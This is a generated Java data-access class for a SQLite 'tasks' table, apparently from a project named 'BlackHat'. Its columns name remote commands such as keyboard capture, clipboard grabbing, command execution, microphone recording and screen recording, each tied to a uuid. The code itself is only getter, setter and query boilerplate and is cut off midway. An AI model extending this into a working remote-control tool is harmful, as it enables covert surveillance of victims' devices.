
// <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:FILE_NOTE
/*
 *  DBObject.URL:file:/home/abaza/NetBeansProjects/Network/BlackHat/src/Database/BlackHat_Database.tbobj
 *
 *   This file is generated by 'Simple DB Object Builder'. It maybe be 
 * regenerated  again in any time. You should not add your code in 
 * this file or you  will lost your code in next time generation.
 *   URL: http://db-obj-builder.sourceforge.net
 *
 *	 Generation Time:2016-02-19 08:14
 *	 Use JDBC Driver:    SQLiteJDBC
 * 
 *	 Generated from:
 *		 URL:   jdbc:sqlite:/home/abaza/NetBeansProjects/Network/BlackHat/data/db
 * 
 *	 JDBC Information:
 *		 Catalog:null
 * 
 *	 Scheam Information:
 *		 TABLE:  tasks
 *		 COLUMN: 
 *			 reboot 	 Object 	 
 *			 shutdown 	 Object 	 
 *			 kill_me 	 Object 	 
 *			 get_keyboard 	 Object 	 
 *			 get_taskmanger 	 Object 	 
 *			 get_clipbord 	 Object 	 
 *			 run_command_line 	 Object 	 
 *			 audio_life_phone 	 Object 	 
 *			 audio_life 	 Object 	 
 *			 audio_record 	 Object 	 
 *			 screen_record_life 	 Object 	 
 *			 screen_record_screnshot 	 Object 	 
 *			 screen_record_video 	 Object 	 
 *			 id 	 Object 	 
 *			 uuid 	 Object 	 
 *		 PRIMARY KEY:
 *			 id        Object
 * 
 */
// </editor-fold>//GEN-END:FILE_NOTE

package Database;

// <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:IMPORT_SECTION
// IMPORT SECTION START ------------------------------------------------
import java.sql.*;
import java.util.StringTokenizer;
import java.util.ArrayList;
import java.util.HashMap;
import java.lang.reflect.Method;
import java.lang.Object;
// IMPORT SECTION END --------------------------------------------------

// </editor-fold>//GEN-END:IMPORT_SECTION

public class Tasks {
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:LOAD_JDBC_DRIVER
    // LOAD JDBC DRIVER START ----------------------------------------------
    static{
        try{
            loadJdbcDriver();
        }catch(ClassNotFoundException e){
            String errMsg = getExcpMsg(e);
            throw new RuntimeException(errMsg, e);
        }
    }
    public static void loadJdbcDriver() throws ClassNotFoundException{
        Class.forName("org.sqlite.JDBC");
    }
    private static String getExcpMsg(Exception e){
        return e.getClass().getName()+"(msg:"+e.getMessage()+")";
    }
    // LOAD JDBC DRIVER END ------------------------------------------------
    // </editor-fold>//GEN-END:LOAD_JDBC_DRIVER
    
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:TABLE_SCHEMA_INFO
    // TABLE SCHEMA INFORMATION START --------------------------------------
    // column fields
    public static final String FLD_REBOOT = "reboot" ; 
    public static final String FLD_SHUTDOWN = "shutdown" ; 
    public static final String FLD_KILL_ME = "kill_me" ; 
    public static final String FLD_GET_KEYBOARD = "get_keyboard" ; 
    public static final String FLD_GET_TASKMANGER = "get_taskmanger" ; 
    public static final String FLD_GET_CLIPBORD = "get_clipbord" ; 
    public static final String FLD_RUN_COMMAND_LINE = "run_command_line" ; 
    public static final String FLD_AUDIO_LIFE_PHONE = "audio_life_phone" ; 
    public static final String FLD_AUDIO_LIFE = "audio_life" ; 
    public static final String FLD_AUDIO_RECORD = "audio_record" ; 
    public static final String FLD_SCREEN_RECORD_LIFE = "screen_record_life" ; 
    public static final String FLD_SCREEN_RECORD_SCRENSHOT = "screen_record_screnshot" ; 
    public static final String FLD_SCREEN_RECORD_VIDEO = "screen_record_video" ; 
    public static final String FLD_ID = "id" ; 
    public static final String FLD_UUID = "uuid" ; 
    // column fields
    public static final String FLD_AUTO_INCREMENT = null  ; 
    // column names
    private static final String[] colNames = new String[]{
        "reboot"
        ,"shutdown"
        ,"kill_me"
        ,"get_keyboard"
        ,"get_taskmanger"
        ,"get_clipbord"
        ,"run_command_line"
        ,"audio_life_phone"
        ,"audio_life"
        ,"audio_record"
        ,"screen_record_life"
        ,"screen_record_screnshot"
        ,"screen_record_video"
        ,"id"
        ,"uuid"
    };
    // 	 column SQL Types
    private static final int[] colSqlTypes = new int[]{
        Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
        ,Types.NULL
    };
    // 	 column class name
    private static final String[] colClzNames = new String[]{
        "java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
        ,"java.lang.Object"
    };
    // 	 load all column classes
    private static final Class[] colClzs = new Class[15];
    static {
        try{
            loadAllColumnClasses();
        }catch(ClassNotFoundException e){
            String errMsg = getExcpMsg(e);
            throw new RuntimeException(errMsg, e);
        }
    }
    public static void loadAllColumnClasses() throws ClassNotFoundException{
        colClzs[0]=Class.forName("java.lang.Object");
        colClzs[1]=Class.forName("java.lang.Object");
        colClzs[2]=Class.forName("java.lang.Object");
        colClzs[3]=Class.forName("java.lang.Object");
        colClzs[4]=Class.forName("java.lang.Object");
        colClzs[5]=Class.forName("java.lang.Object");
        colClzs[6]=Class.forName("java.lang.Object");
        colClzs[7]=Class.forName("java.lang.Object");
        colClzs[8]=Class.forName("java.lang.Object");
        colClzs[9]=Class.forName("java.lang.Object");
        colClzs[10]=Class.forName("java.lang.Object");
        colClzs[11]=Class.forName("java.lang.Object");
        colClzs[12]=Class.forName("java.lang.Object");
        colClzs[13]=Class.forName("java.lang.Object");
        colClzs[14]=Class.forName("java.lang.Object");
    }
    // 	 all columns string
    public static final String ALL_COL_STR="reboot,shutdown,kill_me,get_keyboard,get_taskmanger,get_clipbord,run_command_line,audio_life_phone,audio_life,audio_record,screen_record_life,screen_record_screnshot,screen_record_video,id,uuid";
    // 	 variable definition for table columns
    public final ArrayList nullAL =new ArrayList();
    private Object reboot ;
    private Object shutdown ;
    private Object kill_me ;
    private Object get_keyboard ;
    private Object get_taskmanger ;
    private Object get_clipbord ;
    private Object run_command_line ;
    private Object audio_life_phone ;
    private Object audio_life ;
    private Object audio_record ;
    private Object screen_record_life ;
    private Object screen_record_screnshot ;
    private Object screen_record_video ;
    private Object id ;
    private Object uuid ;
    // 	 variable definition for dirty check
    private boolean isDirty = true;
    // 	 variable definition for user object
    private Object usrObj = null;
    // TABLE SCHEMA INFORMATION END ----------------------------------------
    // </editor-fold>//GEN-END:TABLE_SCHEMA_INFO
    
    public Tasks(){}
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:SCHEMA_METHOD_SECTION
    // SCEHMA METHODS START ------------------------------------------------
    public static int getColCount(){ return 15; }
    public static String getColName(int colIdx){
        if( colIdx>=0 && colIdx<15 ) return colNames[colIdx];
        else return null;
    }
    public static int getColIdx(String colName){
        if(colName==null) return -1;
        for(int i=0;i<15;i++){
            if(colName.equals(colNames[i])) return i;
        }
        return -1;
    }
    public static Class getColClass(int colIdx){
        if( colIdx>=0 && colIdx<15 ) return colClzs[colIdx];
        else return null;
    }
    public static int getColSqlType(int colIdx){
        if( colIdx>=0 && colIdx<15 ) return colSqlTypes[colIdx];
        else return -1;
    }
    public static String getColClzName(int colIdx){
        if( colIdx>=0 && colIdx<15 ) return colClzNames[colIdx];
        else return null;
    }
    // SCEHMA METHODS END --------------------------------------------------
    // </editor-fold>//GEN-END:SCHEMA_METHOD_SECTION
    
    //ATTRIBUTES  START ------------------------------------
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:ATTR_ACCESS_SECTION
    // 	 attributes setter and getter for all table columns 
    // 		 table column: reboot,	 type: Object
    public void setReboot(Object reboot){
        if(reboot==null && !nullAL.contains("reboot")){
            nullAL.add("reboot");
        }else if(reboot!=null && nullAL.contains("reboot")){
            nullAL.remove("reboot");
        }
        boolean changed = false;
        if (this.reboot == null) {
            if (reboot != null) {
                changed = true;
            }
        } else if (!this.reboot.equals(reboot)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.reboot=reboot;
        }
    }
    public Tasks doSetReboot(Object reboot){
        setReboot(reboot);
        return this;
    }
    public Object getReboot(){
        return reboot;
    }
    // 		 table column: shutdown,	 type: Object
    public void setShutdown(Object shutdown){
        if(shutdown==null && !nullAL.contains("shutdown")){
            nullAL.add("shutdown");
        }else if(shutdown!=null && nullAL.contains("shutdown")){
            nullAL.remove("shutdown");
        }
        boolean changed = false;
        if (this.shutdown == null) {
            if (shutdown != null) {
                changed = true;
            }
        } else if (!this.shutdown.equals(shutdown)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.shutdown=shutdown;
        }
    }
    public Tasks doSetShutdown(Object shutdown){
        setShutdown(shutdown);
        return this;
    }
    public Object getShutdown(){
        return shutdown;
    }
    // 		 table column: kill_me,	 type: Object
    public void setKill_me(Object kill_me){
        if(kill_me==null && !nullAL.contains("kill_me")){
            nullAL.add("kill_me");
        }else if(kill_me!=null && nullAL.contains("kill_me")){
            nullAL.remove("kill_me");
        }
        boolean changed = false;
        if (this.kill_me == null) {
            if (kill_me != null) {
                changed = true;
            }
        } else if (!this.kill_me.equals(kill_me)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.kill_me=kill_me;
        }
    }
    public Tasks doSetKill_me(Object kill_me){
        setKill_me(kill_me);
        return this;
    }
    public Object getKill_me(){
        return kill_me;
    }
    // 		 table column: get_keyboard,	 type: Object
    public void setGet_keyboard(Object get_keyboard){
        if(get_keyboard==null && !nullAL.contains("get_keyboard")){
            nullAL.add("get_keyboard");
        }else if(get_keyboard!=null && nullAL.contains("get_keyboard")){
            nullAL.remove("get_keyboard");
        }
        boolean changed = false;
        if (this.get_keyboard == null) {
            if (get_keyboard != null) {
                changed = true;
            }
        } else if (!this.get_keyboard.equals(get_keyboard)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.get_keyboard=get_keyboard;
        }
    }
    public Tasks doSetGet_keyboard(Object get_keyboard){
        setGet_keyboard(get_keyboard);
        return this;
    }
    public Object getGet_keyboard(){
        return get_keyboard;
    }
    // 		 table column: get_taskmanger,	 type: Object
    public void setGet_taskmanger(Object get_taskmanger){
        if(get_taskmanger==null && !nullAL.contains("get_taskmanger")){
            nullAL.add("get_taskmanger");
        }else if(get_taskmanger!=null && nullAL.contains("get_taskmanger")){
            nullAL.remove("get_taskmanger");
        }
        boolean changed = false;
        if (this.get_taskmanger == null) {
            if (get_taskmanger != null) {
                changed = true;
            }
        } else if (!this.get_taskmanger.equals(get_taskmanger)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.get_taskmanger=get_taskmanger;
        }
    }
    public Tasks doSetGet_taskmanger(Object get_taskmanger){
        setGet_taskmanger(get_taskmanger);
        return this;
    }
    public Object getGet_taskmanger(){
        return get_taskmanger;
    }
    // 		 table column: get_clipbord,	 type: Object
    public void setGet_clipbord(Object get_clipbord){
        if(get_clipbord==null && !nullAL.contains("get_clipbord")){
            nullAL.add("get_clipbord");
        }else if(get_clipbord!=null && nullAL.contains("get_clipbord")){
            nullAL.remove("get_clipbord");
        }
        boolean changed = false;
        if (this.get_clipbord == null) {
            if (get_clipbord != null) {
                changed = true;
            }
        } else if (!this.get_clipbord.equals(get_clipbord)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.get_clipbord=get_clipbord;
        }
    }
    public Tasks doSetGet_clipbord(Object get_clipbord){
        setGet_clipbord(get_clipbord);
        return this;
    }
    public Object getGet_clipbord(){
        return get_clipbord;
    }
    // 		 table column: run_command_line,	 type: Object
    public void setRun_command_line(Object run_command_line){
        if(run_command_line==null && !nullAL.contains("run_command_line")){
            nullAL.add("run_command_line");
        }else if(run_command_line!=null && nullAL.contains("run_command_line")){
            nullAL.remove("run_command_line");
        }
        boolean changed = false;
        if (this.run_command_line == null) {
            if (run_command_line != null) {
                changed = true;
            }
        } else if (!this.run_command_line.equals(run_command_line)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.run_command_line=run_command_line;
        }
    }
    public Tasks doSetRun_command_line(Object run_command_line){
        setRun_command_line(run_command_line);
        return this;
    }
    public Object getRun_command_line(){
        return run_command_line;
    }
    // 		 table column: audio_life_phone,	 type: Object
    public void setAudio_life_phone(Object audio_life_phone){
        if(audio_life_phone==null && !nullAL.contains("audio_life_phone")){
            nullAL.add("audio_life_phone");
        }else if(audio_life_phone!=null && nullAL.contains("audio_life_phone")){
            nullAL.remove("audio_life_phone");
        }
        boolean changed = false;
        if (this.audio_life_phone == null) {
            if (audio_life_phone != null) {
                changed = true;
            }
        } else if (!this.audio_life_phone.equals(audio_life_phone)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.audio_life_phone=audio_life_phone;
        }
    }
    public Tasks doSetAudio_life_phone(Object audio_life_phone){
        setAudio_life_phone(audio_life_phone);
        return this;
    }
    public Object getAudio_life_phone(){
        return audio_life_phone;
    }
    // 		 table column: audio_life,	 type: Object
    public void setAudio_life(Object audio_life){
        if(audio_life==null && !nullAL.contains("audio_life")){
            nullAL.add("audio_life");
        }else if(audio_life!=null && nullAL.contains("audio_life")){
            nullAL.remove("audio_life");
        }
        boolean changed = false;
        if (this.audio_life == null) {
            if (audio_life != null) {
                changed = true;
            }
        } else if (!this.audio_life.equals(audio_life)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.audio_life=audio_life;
        }
    }
    public Tasks doSetAudio_life(Object audio_life){
        setAudio_life(audio_life);
        return this;
    }
    public Object getAudio_life(){
        return audio_life;
    }
    // 		 table column: audio_record,	 type: Object
    public void setAudio_record(Object audio_record){
        if(audio_record==null && !nullAL.contains("audio_record")){
            nullAL.add("audio_record");
        }else if(audio_record!=null && nullAL.contains("audio_record")){
            nullAL.remove("audio_record");
        }
        boolean changed = false;
        if (this.audio_record == null) {
            if (audio_record != null) {
                changed = true;
            }
        } else if (!this.audio_record.equals(audio_record)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.audio_record=audio_record;
        }
    }
    public Tasks doSetAudio_record(Object audio_record){
        setAudio_record(audio_record);
        return this;
    }
    public Object getAudio_record(){
        return audio_record;
    }
    // 		 table column: screen_record_life,	 type: Object
    public void setScreen_record_life(Object screen_record_life){
        if(screen_record_life==null && !nullAL.contains("screen_record_life")){
            nullAL.add("screen_record_life");
        }else if(screen_record_life!=null && nullAL.contains("screen_record_life")){
            nullAL.remove("screen_record_life");
        }
        boolean changed = false;
        if (this.screen_record_life == null) {
            if (screen_record_life != null) {
                changed = true;
            }
        } else if (!this.screen_record_life.equals(screen_record_life)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.screen_record_life=screen_record_life;
        }
    }
    public Tasks doSetScreen_record_life(Object screen_record_life){
        setScreen_record_life(screen_record_life);
        return this;
    }
    public Object getScreen_record_life(){
        return screen_record_life;
    }
    // 		 table column: screen_record_screnshot,	 type: Object
    public void setScreen_record_screnshot(Object screen_record_screnshot){
        if(screen_record_screnshot==null && !nullAL.contains("screen_record_screnshot")){
            nullAL.add("screen_record_screnshot");
        }else if(screen_record_screnshot!=null && nullAL.contains("screen_record_screnshot")){
            nullAL.remove("screen_record_screnshot");
        }
        boolean changed = false;
        if (this.screen_record_screnshot == null) {
            if (screen_record_screnshot != null) {
                changed = true;
            }
        } else if (!this.screen_record_screnshot.equals(screen_record_screnshot)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.screen_record_screnshot=screen_record_screnshot;
        }
    }
    public Tasks doSetScreen_record_screnshot(Object screen_record_screnshot){
        setScreen_record_screnshot(screen_record_screnshot);
        return this;
    }
    public Object getScreen_record_screnshot(){
        return screen_record_screnshot;
    }
    // 		 table column: screen_record_video,	 type: Object
    public void setScreen_record_video(Object screen_record_video){
        if(screen_record_video==null && !nullAL.contains("screen_record_video")){
            nullAL.add("screen_record_video");
        }else if(screen_record_video!=null && nullAL.contains("screen_record_video")){
            nullAL.remove("screen_record_video");
        }
        boolean changed = false;
        if (this.screen_record_video == null) {
            if (screen_record_video != null) {
                changed = true;
            }
        } else if (!this.screen_record_video.equals(screen_record_video)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.screen_record_video=screen_record_video;
        }
    }
    public Tasks doSetScreen_record_video(Object screen_record_video){
        setScreen_record_video(screen_record_video);
        return this;
    }
    public Object getScreen_record_video(){
        return screen_record_video;
    }
    // 		 table column: id,	 type: Object
    public void setId(Object id){
        if(id==null && !nullAL.contains("id")){
            nullAL.add("id");
        }else if(id!=null && nullAL.contains("id")){
            nullAL.remove("id");
        }
        boolean changed = false;
        if (this.id == null) {
            if (id != null) {
                changed = true;
            }
        } else if (!this.id.equals(id)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.id=id;
        }
    }
    public Tasks doSetId(Object id){
        setId(id);
        return this;
    }
    public Object getId(){
        return id;
    }
    // 		 table column: uuid,	 type: Object
    public void setUuid(Object uuid){
        if(uuid==null && !nullAL.contains("uuid")){
            nullAL.add("uuid");
        }else if(uuid!=null && nullAL.contains("uuid")){
            nullAL.remove("uuid");
        }
        boolean changed = false;
        if (this.uuid == null) {
            if (uuid != null) {
                changed = true;
            }
        } else if (!this.uuid.equals(uuid)) {
            changed = true;
        }
        if (changed) {
            if (!this.isDirty) {
                this.isDirty = true;
            }
            this.uuid=uuid;
        }
    }
    public Tasks doSetUuid(Object uuid){
        setUuid(uuid);
        return this;
    }
    public Object getUuid(){
        return uuid;
    }
    // </editor-fold>//GEN-END:ATTR_ACCESS_SECTION
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:ATTR_ACCESS_SECTION2
    public void clearAllAttributes(){
        reboot = null;
        shutdown = null;
        kill_me = null;
        get_keyboard = null;
        get_taskmanger = null;
        get_clipbord = null;
        run_command_line = null;
        audio_life_phone = null;
        audio_life = null;
        audio_record = null;
        screen_record_life = null;
        screen_record_screnshot = null;
        screen_record_video = null;
        id = null;
        uuid = null;
    }
    public void resetAttributes(Tasks tasks){
        reboot = tasks.getReboot();
        shutdown = tasks.getShutdown();
        kill_me = tasks.getKill_me();
        get_keyboard = tasks.getGet_keyboard();
        get_taskmanger = tasks.getGet_taskmanger();
        get_clipbord = tasks.getGet_clipbord();
        run_command_line = tasks.getRun_command_line();
        audio_life_phone = tasks.getAudio_life_phone();
        audio_life = tasks.getAudio_life();
        audio_record = tasks.getAudio_record();
        screen_record_life = tasks.getScreen_record_life();
        screen_record_screnshot = tasks.getScreen_record_screnshot();
        screen_record_video = tasks.getScreen_record_video();
        id = tasks.getId();
        uuid = tasks.getUuid();
    }
    private void setAttributes(ResultSet rs)throws SQLException{
        ResultSetMetaData rsmd = rs.getMetaData();
        int colCnt = rsmd.getColumnCount();
        for(int idx=0;idx<colCnt;idx++){
            String colName  = rsmd.getColumnName(idx+1);
            String colClzNm = getColClzName(idx);
            Object colValue = null;
            if("java.sql.Timestamp".equals(colClzNm)){
                colValue = rs.getTimestamp(idx+1);
            }else{
                colValue = rs.getObject(idx+1);
            }
            setAttribute(colName,colValue);
        }
    }
    private void setAttribute(String colName,Object colValue){
        if("reboot".equals(colName)){
            this.setReboot((Object)colValue);
        }else if("shutdown".equals(colName)){
            this.setShutdown((Object)colValue);
        }else if("kill_me".equals(colName)){
            this.setKill_me((Object)colValue);
        }else if("get_keyboard".equals(colName)){
            this.setGet_keyboard((Object)colValue);
        }else if("get_taskmanger".equals(colName)){
            this.setGet_taskmanger((Object)colValue);
        }else if("get_clipbord".equals(colName)){
            this.setGet_clipbord((Object)colValue);
        }else if("run_command_line".equals(colName)){
            this.setRun_command_line((Object)colValue);
        }else if("audio_life_phone".equals(colName)){
            this.setAudio_life_phone((Object)colValue);
        }else if("audio_life".equals(colName)){
            this.setAudio_life((Object)colValue);
        }else if("audio_record".equals(colName)){
            this.setAudio_record((Object)colValue);
        }else if("screen_record_life".equals(colName)){
            this.setScreen_record_life((Object)colValue);
        }else if("screen_record_screnshot".equals(colName)){
            this.setScreen_record_screnshot((Object)colValue);
        }else if("screen_record_video".equals(colName)){
            this.setScreen_record_video((Object)colValue);
        }else if("id".equals(colName)){
            this.setId((Object)colValue);
        }else if("uuid".equals(colName)){
            this.setUuid((Object)colValue);
        }
    }
    public void setColValue(int colIdx,Object colValue){
        String colName = getColName(colIdx);
        setAttribute(colName,colValue);
    }
    public Object getColValue(int colIdx){
        String colName = getColName(colIdx);
        return getColValue(colName);
    }
    public Object getColValue(String colName){
        if("reboot".equals(colName)){
            return this.getReboot();
        }else if("shutdown".equals(colName)){
            return this.getShutdown();
        }else if("kill_me".equals(colName)){
            return this.getKill_me();
        }else if("get_keyboard".equals(colName)){
            return this.getGet_keyboard();
        }else if("get_taskmanger".equals(colName)){
            return this.getGet_taskmanger();
        }else if("get_clipbord".equals(colName)){
            return this.getGet_clipbord();
        }else if("run_command_line".equals(colName)){
            return this.getRun_command_line();
        }else if("audio_life_phone".equals(colName)){
            return this.getAudio_life_phone();
        }else if("audio_life".equals(colName)){
            return this.getAudio_life();
        }else if("audio_record".equals(colName)){
            return this.getAudio_record();
        }else if("screen_record_life".equals(colName)){
            return this.getScreen_record_life();
        }else if("screen_record_screnshot".equals(colName)){
            return this.getScreen_record_screnshot();
        }else if("screen_record_video".equals(colName)){
            return this.getScreen_record_video();
        }else if("id".equals(colName)){
            return this.getId();
        }else if("uuid".equals(colName)){
            return this.getUuid();
        }
        return null;
    }
    // </editor-fold>//GEN-END:ATTR_ACCESS_SECTION2
    
    // ATTRIBUTES END ------------------------------------------------------
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:EQU_STR_SECTION
    public String toString(){
        String tmpSql="";
        tmpSql+="reboot="+reboot+",";
        tmpSql+="shutdown="+shutdown+",";
        tmpSql+="kill_me="+kill_me+",";
        tmpSql+="get_keyboard="+get_keyboard+",";
        tmpSql+="get_taskmanger="+get_taskmanger+",";
        tmpSql+="get_clipbord="+get_clipbord+",";
        tmpSql+="run_command_line="+run_command_line+",";
        tmpSql+="audio_life_phone="+audio_life_phone+",";
        tmpSql+="audio_life="+audio_life+",";
        tmpSql+="audio_record="+audio_record+",";
        tmpSql+="screen_record_life="+screen_record_life+",";
        tmpSql+="screen_record_screnshot="+screen_record_screnshot+",";
        tmpSql+="screen_record_video="+screen_record_video+",";
        tmpSql+="id="+id+",";
        tmpSql+="uuid="+uuid+",";
        return tmpSql;
    }
    public boolean equals(Object obj){
        if(!(obj instanceof Tasks)) return false;
        Tasks anObj = (Tasks)obj ;
        if(reboot==null){
            if(anObj.getReboot()!=null){
                return false;
            }
        }else if(!reboot.equals(anObj.getReboot())){
            return false;
        }
        if(shutdown==null){
            if(anObj.getShutdown()!=null){
                return false;
            }
        }else if(!shutdown.equals(anObj.getShutdown())){
            return false;
        }
        if(kill_me==null){
            if(anObj.getKill_me()!=null){
                return false;
            }
        }else if(!kill_me.equals(anObj.getKill_me())){
            return false;
        }
        if(get_keyboard==null){
            if(anObj.getGet_keyboard()!=null){
                return false;
            }
        }else if(!get_keyboard.equals(anObj.getGet_keyboard())){
            return false;
        }
        if(get_taskmanger==null){
            if(anObj.getGet_taskmanger()!=null){
                return false;
            }
        }else if(!get_taskmanger.equals(anObj.getGet_taskmanger())){
            return false;
        }
        if(get_clipbord==null){
            if(anObj.getGet_clipbord()!=null){
                return false;
            }
        }else if(!get_clipbord.equals(anObj.getGet_clipbord())){
            return false;
        }
        if(run_command_line==null){
            if(anObj.getRun_command_line()!=null){
                return false;
            }
        }else if(!run_command_line.equals(anObj.getRun_command_line())){
            return false;
        }
        if(audio_life_phone==null){
            if(anObj.getAudio_life_phone()!=null){
                return false;
            }
        }else if(!audio_life_phone.equals(anObj.getAudio_life_phone())){
            return false;
        }
        if(audio_life==null){
            if(anObj.getAudio_life()!=null){
                return false;
            }
        }else if(!audio_life.equals(anObj.getAudio_life())){
            return false;
        }
        if(audio_record==null){
            if(anObj.getAudio_record()!=null){
                return false;
            }
        }else if(!audio_record.equals(anObj.getAudio_record())){
            return false;
        }
        if(screen_record_life==null){
            if(anObj.getScreen_record_life()!=null){
                return false;
            }
        }else if(!screen_record_life.equals(anObj.getScreen_record_life())){
            return false;
        }
        if(screen_record_screnshot==null){
            if(anObj.getScreen_record_screnshot()!=null){
                return false;
            }
        }else if(!screen_record_screnshot.equals(anObj.getScreen_record_screnshot())){
            return false;
        }
        if(screen_record_video==null){
            if(anObj.getScreen_record_video()!=null){
                return false;
            }
        }else if(!screen_record_video.equals(anObj.getScreen_record_video())){
            return false;
        }
        if(id==null){
            if(anObj.getId()!=null){
                return false;
            }
        }else if(!id.equals(anObj.getId())){
            return false;
        }
        if(uuid==null){
            if(anObj.getUuid()!=null){
                return false;
            }
        }else if(!uuid.equals(anObj.getUuid())){
            return false;
        }
        return true;
    }
    // </editor-fold>//GEN-END:EQU_STR_SECTION
    
    // SQL QUERY METHODS START ---------------------------------------------
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:GENERAL_QUERY
    // total arg: colStr, maxRows, pStmtParamAL
    // skip colStr, maxRows, pStmtParamAL
    public static Tasks queryFirstRow(Connection conn,String whereStr) throws SQLException{
        Tasks[] rows = queryDB(conn,ALL_COL_STR,whereStr,null, 1);
        if(rows==null || rows.length == 0) return null;
        return rows[0];
    }
    public static Tasks[] queryDB(Connection conn,String whereStr) throws SQLException{
        return queryDB(conn,ALL_COL_STR,whereStr,null, -1);
    }
    // skip colStr, maxRows
    public static Tasks queryFirstRow(Connection conn,String whereStr,ArrayList pStmtParamAL) throws SQLException{
        Tasks[] rows = queryDB(conn,ALL_COL_STR,whereStr,pStmtParamAL, 1);
        if(rows==null || rows.length == 0) return null;
        return rows[0];
    }
    public static Tasks[] queryDB(Connection conn,String whereStr,ArrayList pStmtParamAL) throws SQLException{
        return queryDB(conn,ALL_COL_STR,whereStr,pStmtParamAL, -1);
    }
    // skip colStr, pStmtParamAL
    public static Tasks[] queryDB(Connection conn,String whereStr, int maxRows) throws SQLException{
        return queryDB(conn,ALL_COL_STR,whereStr,null, maxRows);
    }
    // skip colStr
    public static Tasks[] queryDB(Connection conn,String whereStr,ArrayList pStmtParamAL , int maxRows) throws SQLException{
        return queryDB(conn,ALL_COL_STR,whereStr, pStmtParamAL, maxRows);
    }
    // skip maxRows
    public static Tasks[] queryDB(Connection conn,String colStr,String whereStr, ArrayList pStmtParamAL) throws SQLException{
        return queryDB(conn,colStr, whereStr,pStmtParamAL,-1);
    }
    public static Tasks[] queryDB(Connection conn,String colStr,String whereStr, ArrayList pStmtParamAL, int maxRows) throws SQLException{
        ResultSet rs = null;
        try{
            rs = queryResultSet(conn, colStr, whereStr,pStmtParamAL);
            ArrayList tmpAL=new ArrayList();
            while(rs.next()){
                Tasks obj=new Tasks();
                obj.setAttributes(rs);
                tmpAL.add(obj);
                if(maxRows>0 && tmpAL.size()>= maxRows) break;
            }
            Tasks[] objs=new Tasks[tmpAL.size()];
            tmpAL.toArray(objs);
            return objs;
        }finally{
            releaseResultSet(rs);
        }
    }
    public static ResultSet queryResultSet(Connection conn,String colStr,String whereStr, ArrayList pStmtParamAL) throws SQLException{
        String sqlStr="SELECT "+colStr+" FROM tasks "+whereStr;
        PreparedStatement pStmt = conn.prepareStatement(sqlStr);
        if(pStmtParamAL!=null){
            for(int idx=0;idx<pStmtParamAL.size();idx++){
                Object param = pStmtParamAL.get(idx);
                pStmt.setObject(idx+1,param);//test
            }
        }
        return pStmt.executeQuery();
    }
    public static void releaseResultSet(ResultSet rs) throws SQLException{
        if(rs!=null){
            Statement stmt = rs.getStatement();
            try{rs.close();}catch(Exception e){System.out.println("e:"+e);}
            try{stmt.close();}catch(Exception e){System.out.println("e:"+e);}
        }
    }
    // </editor-fold>//GEN-END:GENERAL_QUERY
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:PRIMARY_KEY_QUERY
    public static Tasks queryByPK(Connection conn, Object id) throws SQLException {
        return queryByPK(conn, ALL_COL_STR, id);
    }
    public static Tasks queryByPK(Connection conn, String colStr, Object id) throws SQLException {
        String sqlStr="SELECT "+colStr+" FROM tasks WHERE id = ? ";
        Tasks ans = null;
        PreparedStatement pStmt = null;
        ResultSet rs = null;
        try{
            pStmt=conn.prepareStatement(sqlStr);
            pStmt.setObject(1,id);
            rs = pStmt.executeQuery();
            if(rs.next()){
                ans = new Tasks();
                ans.setAttributes(rs);
            }
        }finally{
            if(rs!=null) rs.close();
            if(pStmt!=null) pStmt.close();
        }
        return ans;
    }
    // </editor-fold>//GEN-END:PRIMARY_KEY_QUERY
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:FOREIGN_KEY_QUERY
    // </editor-fold>//GEN-END:FOREIGN_KEY_QUERY
    
    // SQL QUERY METHODS END -----------------------------------------------
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:INSERT_DELETE_UPDATE_METHOD
    // SQL MODIFICATION METHODS START --------------------------------------
